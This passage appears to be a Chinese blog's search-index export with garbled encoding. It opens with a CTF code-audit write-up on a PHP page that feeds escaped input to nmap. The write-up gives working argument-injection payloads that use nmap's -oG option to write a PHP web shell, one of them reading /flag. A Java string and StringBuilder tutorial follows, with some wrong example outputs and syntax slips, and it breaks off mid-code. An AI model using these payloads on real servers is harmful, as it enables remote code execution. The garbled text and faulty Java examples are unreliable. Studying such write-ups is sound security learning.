<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åä¸€è¡Œä»£ç æ˜¯æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†ã€‚è¿™é‡Œå¸¸è§çš„å‘½ä»¤åæ³¨å…¥æ“ä½œå¦‚<code> | &amp; &amp;&amp;</code>éƒ½ä¸è¡Œï¼Œ<code>escapeshellcmd</code>ä¼šå¯¹è¿™äº›ç‰¹æ®Šç¬¦å·å‰é¢åŠ ä¸Š<code>\</code>æ¥è½¬ä¹‰ã€‚</p>
<p>é‚£ä¹ˆå°±åº”è¯¥æƒ³æƒ³æ€ä¹ˆåˆ©ç”¨nmapæ¥åšäº›ä»€ä¹ˆã€‚</p>
<blockquote>
<p>nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGæˆ–è€…-oNå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
</blockquote>
<p>æ¥ä¸‹æ¥è€ƒè™‘ä¸¤ä¸ªå‡½æ•°çš„æ•ˆæœï¼Œæµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo;?&gt; -oG shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡º\ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host:&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;&lt;&#x2F;br&gt;</span><br><span class="line">arg:&#39;&#39;\&#39;&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;\&#39;&#39;&#39;&lt;&#x2F;br&gt;</span><br><span class="line">cmd:&#39;&#39;\\&#39;&#39; \&lt;\?php phpinfo\;\?\&gt; -oG shell.php &#39;\\&#39;&#39;&#39;&lt;&#x2F;br&gt;</span><br></pre></td></tr></table></figure>
<p><code>escapeshellarg</code>ä¼šå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œæ­¤æ—¶çš„ç»“æœåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php \&#39;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¯¹<code>\</code>åˆ†å‰²çš„æ¯ä¸ªéƒ¨åˆ†åŠ ä¸Šå•å¼•å·ï¼Œå¹¶è¿æ¥ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;\&#39;&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php &#39;\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åï¼Œè¿›è¡Œäº†<code>escapeshellcmd</code>ï¼Œä¼šå¯¹ä¸Šè¾¹æåˆ°çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;\\&#39;&#39;\&lt;\?php phpinfo\(\)\;\?\&gt; -oG shell.php &#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>å¸¦å…¥åˆ°å‘½ä»¤è¡Œæ‰§è¡Œçš„ç»“æœå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ &lt;?php phpinfo();?&gt; -oG shell.php \\</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php phpinfo();?&gt; -oG shell.php &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617114825.png" alt=""></p>
<p>è¯»å–flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG mmm.php &#39;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»</title>
    <url>/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»">JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»</h1>
<h3 id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</h3>
<p><code>String</code>æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒçš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯<strong>ä¸å¯å˜</strong>ï¼Œè¿™ç§ä¸å¯å˜æ€§æ˜¯é€šè¿‡å†…éƒ¨çš„<code>private final char[]</code>å­—æ®µï¼Œä»¥åŠæ²¡æœ‰ä»»ä½•ä¿®æ”¹<code>char[]</code>çš„æ–¹æ³•å®ç°çš„ã€‚</p>
<h4 id="å­—ç¬¦ä¸²æ¯”è¾ƒ">å­—ç¬¦ä¸²æ¯”è¾ƒ</h4>
<p>å½“æˆ‘ä»¬æƒ³è¦æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒæ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯æƒ³æ¯”è¾ƒå­—ç¬¦ä¸²çš„å†…å®¹æ˜¯å¦ç›¸åŒã€‚å¿…é¡»ä½¿ç”¨<code>equals()</code>æ–¹æ³•è€Œä¸èƒ½ç”¨<code>==</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        String s2 = <span class="string">&quot;HELLO&quot;</span>.toLowerCase();</span><br><span class="line">        System.out.println(s1 == s2);</span><br><span class="line">        System.out.println(s1.equals(s2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¦å¿½ç•¥å¤§å°å†™æ¯”è¾ƒï¼Œä½¿ç”¨<code>equalsIgnoreCase()</code>æ–¹æ³•ã€‚</p>
<p>æœç´¢å­ä¸²çš„ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.indexof(<span class="string">&quot;l&quot;</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.lastIndexof(<span class="string">&quot;l&quot;</span>); <span class="comment">//3</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.startsWith(<span class="string">&quot;He&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.endsWith(<span class="string">&quot;lo&quot;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>æå–å­ä¸²çš„ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.substring(<span class="number">2</span>); <span class="comment">//&quot;llo&quot;</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.substring(<span class="number">2</span>, <span class="number">4</span>); <span class="comment">//&quot;llo&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦">å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦</h4>
<p>ä½¿ç”¨<code>trim()</code>æ–¹æ³•å¯ä»¥ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾ç©ºç™½å­—ç¬¦ã€‚ç©ºç™½å­—ç¬¦åŒ…æ‹¬ç©ºæ ¼ï¼Œ<code>\t</code>ï¼Œ<code>\r</code>ï¼Œ<code>\n</code>ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼š<code>trim()</code>å¹¶æ²¡æœ‰æ”¹å˜å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œè€Œæ˜¯è¿”å›äº†ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p>å¦ä¸€ä¸ª<code>strip()</code>æ–¹æ³•ä¹Ÿå¯ä»¥ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸­æ–‡çš„ç©ºæ ¼å­—ç¬¦<code>\u3000</code>ã€‚</p>
<p><code>String</code>è¿˜æä¾›äº†<code>isEmpty()</code>å’Œ<code>isBlank()</code>æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºå’Œç©ºç™½å­—ç¬¦ä¸²ã€‚</p>
<h4 id="æ›¿æ¢å­ä¸²">æ›¿æ¢å­ä¸²</h4>
<p>ä½¿ç”¨<code>replace()</code>æ–¹æ³•å¯ä»¥æ ¹æ®å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ›¿æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">s.replace(<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;w&#x27;</span>); <span class="comment">// &quot;hewwo&quot;</span></span><br><span class="line">s.replace(<span class="string">&#x27;ll&#x27;</span>, <span class="string">&quot;~~&quot;</span>); <span class="comment">// &quot;he~~o&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="åˆ†å‰²å­—ç¬¦ä¸²">åˆ†å‰²å­—ç¬¦ä¸²</h4>
<p><code>split()</code>æ–¹æ³•æ ¹æ®åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²ã€‚<strong>æ³¨æ„ï¼š</strong><code> .</code> ã€ <code>|</code>å’Œ <code>*</code> ç­‰è½¬ä¹‰å­—ç¬¦ï¼Œå¿…é¡»å¾—åŠ <code> \\</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = <span class="string">&quot;A,B,C,D&quot;</span>;</span><br><span class="line">String[] ss = s.split(<span class="string">&quot;\\,&quot;</span>); <span class="comment">// &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="æ‹¼æ¥å­—ç¬¦ä¸²">æ‹¼æ¥å­—ç¬¦ä¸²</h4>
<p>æ‹¼æ¥å­—ç¬¦ä¸²ä½¿ç”¨é™æ€æ–¹æ³•<code>join()</code>ï¼Œå®ƒç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ä¸²æ•°ç»„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = &#123;<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">String s = String.join(<span class="string">&quot;***&quot;</span>, arr); <span class="comment">// &quot;A***B***C&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="ç±»å‹è½¬æ¢">ç±»å‹è½¬æ¢</h4>
<p>é™æ€æ–¹æ³•<code>valueOf()</code>å¯ä»¥å§ä»»æ„åŸºæœ¬ç±»å‹æˆ–å¼•ç”¨ç±»å‹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String.valueOf(<span class="number">123</span>); <span class="comment">//&quot;123&quot;</span></span><br><span class="line">String.valueOf(<span class="number">45.67</span>); <span class="comment">//&quot;45.67&quot;</span></span><br><span class="line">String.valueOf(<span class="keyword">true</span>); <span class="comment">//&quot;true&quot;</span></span><br><span class="line">String.valueOf(<span class="keyword">new</span> Object()); <span class="comment">//java.lang.Object@40f08448</span></span><br></pre></td></tr></table></figure>
<p>å­—ç¬¦ä¸²è½¬æ¢ä¸º<code>int</code>ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n1 = Integer.parseInt(<span class="string">&quot;123&quot;</span>); <span class="comment">//123</span></span><br><span class="line"><span class="keyword">int</span> n2 = Integer.parseInt(<span class="string">&quot;ff&quot;</span>, <span class="number">16</span>); <span class="comment">//æŒ‰åå…­è¿›åˆ¶è½¬æ¢ï¼Œ255</span></span><br></pre></td></tr></table></figure>
<p>å­—ç¬¦ä¸²è½¬æ¢ä¸º<code>boolean</code>ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> b1 = Boolean.parseBoolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> b2 = Boolean.parseBoolean(<span class="string">&quot;FALSE&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è½¬æ¢ä¸ºchar">è½¬æ¢ä¸ºchar[]</h4>
<p><code>String</code>å’Œ<code>char</code>å¯ä»¥äº’ç›¸è½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="string">&quot;Hello&quot;</span>.toCharArray();</span><br><span class="line">String s = <span class="keyword">new</span> String(cs);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¿®æ”¹äº†<code>char[]</code>æ•°ç»„ï¼Œ<code>String</code>å¹¶ä¸ä¼šæ”¹å˜ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cs = <span class="string">&quot;Hello&quot;</span>.toCharArray();</span><br><span class="line">        String s = <span class="keyword">new</span> String(cs);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        cs[<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// Hello</span></span><br><span class="line"><span class="comment">// Hello</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯å› ä¸ºé€šè¿‡<code>new String(char[])</code>åˆ›å»ºæ–°çš„<code>String</code>å®ä¾‹æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›´æ¥å¼•ç”¨ä¼ å…¥çš„<code>char[]</code>æ•°ç»„ï¼Œè€Œæ˜¯ä¼šå¤åˆ¶ä¸€ä»½ï¼Œæ‰€ä»¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„<code>char[]</code>æ•°ç»„ä¸ä¼šå½±å“<code>String</code>å®ä¾‹å†…éƒ¨çš„<code>char[]</code>æ•°ç»„ï¼Œå› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„ã€‚</p>
<p>æ‰€ä»¥ï¼Œå¦‚æœä¼ å…¥çš„å¯¹è±¡æœ‰å¯èƒ½æ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è€Œä¸æ˜¯ç›´æ¥å¼•ç”¨ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] scores = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">88</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line">        Score s = <span class="keyword">new</span> Score(scores);</span><br><span class="line">        s.printScores();</span><br><span class="line">        scores[<span class="number">2</span>] = <span class="number">55</span>;</span><br><span class="line">        s.printScores;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Score</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] scores;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Score</span><span class="params">(<span class="keyword">int</span>[] scores)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.scores = scores;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printScores</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Arrays.toString(scores));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// 88, 99, 11, 22, 33</span></span><br><span class="line"><span class="comment">// 88, 99, 55, 22, 33</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿä¸¤æ¬¡è¾“å‡ºï¼Œç”±äº<code>Score</code>å†…éƒ¨ç›´æ¥å¼•ç”¨äº†å¤–éƒ¨ä¼ å…¥çš„<code>int[]</code>æ•°ç»„ï¼Œè¿™ä¼šé€ æˆå¤–éƒ¨ä»£ç å¯¹<code>int[]</code>æ•°ç»„çš„ä¿®æ”¹ï¼Œå½±å“åˆ°<code>Score</code>ç±»çš„å­—æ®µã€‚æ­£ç¡®çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Score</span><span class="params">(<span class="keyword">int</span>[] scores)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.scores = scores.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="StringBuilder">StringBuilder</h3>
<p><code>StringBuilder</code>æ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œèƒ½é«˜æ•ˆæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå¾€<code>StringBuilder</code>ä¸­æ–°å¢å­—ç¬¦æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ä¸´æ—¶å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    sb.append(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    sb.append(i);</span><br><span class="line">&#125;</span><br><span class="line">String s = sb.toString();</span><br><span class="line">System.out.println(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// 0,1,2,3...999</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–ï¼Œ<code>StringBuilder</code>è¿˜å¯ä»¥è¿›è¡Œé“¾å¼æ“ä½œï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder(<span class="number">1024</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Mr&quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;Bob&quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">            .insert(<span class="number">0</span>, <span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// Hello, Mr Bob!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ”¯æŒé“¾å¼æ“ä½œçš„å…³é”®å¯ä»¥ä»<code>StringBuilder</code>æºç çœ‹å‡ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> StringBuilder <span class="title">append</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.append(str);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> AbstractStringBuilder <span class="title">append</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> appendNull();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> len = str.length();</span><br><span class="line">        ensureCapacityInternal(count + len);</span><br><span class="line">        putStringAt(count, str);</span><br><span class="line">        count += len;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å®šä¹‰çš„<code>append()</code>æ–¹æ³•ä¼šè¿”å›<code>this</code>ï¼Œè¿™æ ·ï¼Œå°±å¯ä»¥ä¸æ–­è°ƒç”¨è‡ªèº«çš„å…¶ä»–æ–¹æ³•ã€‚</p>
<p>æ¨¡ä»¿<code>StringBuilder</code>è®¾è®¡ä¸€ä¸ªå¯ä»¥ä¸æ–­å¢åŠ çš„è®¡æ•°å™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Adder adder = <span class="keyword">new</span> Adder();</span><br><span class="line">        adder.add(<span class="number">2</span>)</span><br><span class="line">            .add(<span class="number">5</span>)</span><br><span class="line">            .inc()</span><br><span class="line">            .add(<span class="number">10</span>);</span><br><span class="line">        System.out.println(adder.value())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Adder <span class="title">add</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        sum += n;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Adder <span class="title">inc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sum ++;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// 18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»ƒä¹ ">ç»ƒä¹ </h4>
<p>è¯·ä½¿ç”¨<code>StringBuilder</code>æ„é€ ä¸€ä¸ª<code>INSERT</code>SQLè¯­å¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String[] fields = &#123; <span class="string">&quot;name&quot;</span>, <span class="string">&quot;position&quot;</span>, <span class="string">&quot;salary&quot;</span> &#125;;</span><br><span class="line">		String table = <span class="string">&quot;employee&quot;</span>;</span><br><span class="line">		String insert = buildInsertSql(table, fields);</span><br><span class="line">		System.out.println(insert);</span><br><span class="line">		System.out.println(</span><br><span class="line">				<span class="string">&quot;INSERT INTO employee (name, position, salary) VALUES (?, ?, ?)&quot;</span>.equals(insert) ? <span class="string">&quot;æµ‹è¯•æˆåŠŸ&quot;</span> : <span class="string">&quot;æµ‹è¯•å¤±è´¥&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">buildInsertSql</span><span class="params">(String table, String[] fields)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;INSERT INTO &quot;</span>).append(table).append(<span class="string">&quot; (&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (String st: fields) &#123;</span><br><span class="line">			sb.append(st).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">         <span class="comment">// æ³¨æ„å»æ‰æœ€åçš„&quot;, 